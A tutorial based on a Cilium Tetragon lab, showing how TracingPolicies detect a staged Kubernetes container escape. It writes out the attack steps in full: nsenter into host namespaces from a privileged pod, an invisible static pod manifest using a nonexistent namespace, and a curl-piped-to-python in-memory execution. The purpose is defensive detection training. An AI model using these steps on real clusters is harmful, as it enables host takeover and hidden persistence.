# Getting started with Tetragon

Link to lab - https://isovalent.com/labs/security-observability-with-ebpf-and-cilium-tetragon/.

Install `Cilium Tetragon Helm chart` :

```sh
helm repo add cilium https://helm.cilium.io
helm repo update
helm install tetragon cilium/tetragon --version 1.0.1 \
  -n kube-system -f tetragon.helm-values.yaml
```

Cilium Tetragon will run as a `Daemonset` which **implements the eBPF logic for extracting the `Security Observability events` as well as event filtering, aggregation and export to external event collectors**.

## The problem

Our goal is to `detect container escape` -

* The attacker will use a privileged pod (named `sith-infiltrator`) (which shares `process namespace` and `network namespace` with the host) to enter into all the host namespaces using the `nsenter` command.

* From there, the attacker will write a `static pod manifest` in the `/etc/kubernetes/manifests` directory that will cause the `kubelet` to run that pod. He / she will take advantage of a Kubernetes bug - using a Kubernetes namespace that doesn’t exist, which makes the static pod invisible to the Kubernetes API server and kubectl commands.

* After spinning up the `invisible container`, the attacker is going to download and execute a malicious Python script in memory that never touches disk. **The simple Python script represents a fileless malware which is almost impossible to detect by using traditional userspace tools**.

## The solution

We will need three `TracingPolicies` 🔏.

> `TracingPolicy` is a user-configurable Kubernetes CRD that allows you to trace arbitrary events in the kernel and define actions to be taken on match. It's fully Kubernetes Identity Aware. Once there is an event triggered by a TracingPolicy and the corresponding signature, you can either send an alert to a Security Analyst or prevent the behaviour with a `SIGKILL` signal to the process.

1. The 1st TracingPolicy is used to **monitor networking events and track network connections**. We are going to observe `tcp_connect`, `tcp_close` and `kernel functions` to track when a TCP connection opens and closes.

    Deploy the TracingPolicy :
    ```sh
    kubectl apply -f tracing-policies/networking.yaml
    ```

In terminal window 1, keep observing the Tetragon traced events, happening in the `sith-infiltrator` pod :
```sh
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon \
  -- tetra getevents -o compact --pods sith-infiltrator
```

Open terminal window 2 and create the `sith-infiltrator` pod :
```sh
kubectl apply -f sith-infiltrator.pod.yaml
```

2. The 2nd TracingPolicy is used to **detect the privilege escalation**. It'll monitor the `sys-setns` system call - **used by processes during changing kernel namespaces**.

    Deploy the TracingPolicy :
    ```sh
    kubectl apply -f tracing-policies/sys-setns.yaml
    ```

3. The 3rd TracingPolicy will **monitor read and write access to sensitive files**. This way, we can **detect creation of the invisible Pod**. We will observe the `__x64_sys_write` and `__x64_sys_read` system calls which are executed on files under the `/etc/kubernetes/manifests` directory.

    Deploy the TracingPolicy :
    ```sh
    kubectl apply -f tracing-policies/file-write-in-etc-kubernetes-manifests.yaml
    ```

Get into the `sith-inflatrator` pod :
```sh
kubectl exec -it sith-infiltrator -- /bin/bash
```

Use the `nsenter` command to **enter the host's namespace and run bash as root on the host** - `nsenter -t 1 -a bash` (events will be traced by Tetragon and logged in terminal window 1).

> The `nsenter` command is used to execute commands in specified namespaces. The first flag, `-t` defines the target namespace where the command will land. **Every Linux machine runs a process with PID 1 which always runs in the host namespace.** The other command line arguments define the other namespaces where the command also wants to enter, in this case, `-a` describes all the Linux namespaces, which are: `cgroup, ipc, uts, net, pid, mnt, time`. So we break out from the container in every possible way and running the `bash` command as root on the host.

Go into the `/etc/kubernetes/manifests` directory and create a file with the `PodSpec` 👻 :
```sh
cat << EOF > hack-latest.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hack-latest
  hostNetwork: true
  namespace: doesnt-exist

spec:
  containers:
    - name: hack-latest
      image: sublimino/hack:latest
      command: ["/bin/sh"]
      args: ["-c", "while true; do sleep 10;done"]
      securityContext:
        privileged: true
EOF
```

Wait for sometime and then execute `crictl ps`. You'll see the `hack-latest` pod in the list.

Now we will get inside the invisible container and download and execute a malicious Python script (the fileless malware 🧬) in memory that never touches disk.
```sh
CONT_ID=$(crictl ps --name hack-latest --output json | jq -r '.containers[0].id')
crictl exec -it $CONT_ID /bin/bash

curl https://raw.githubusercontent.com/realpython/python-scripts/master/scripts/18_zipper.py | python
```

All the above activities are being traced by Tetragon and logged in terminal window 1.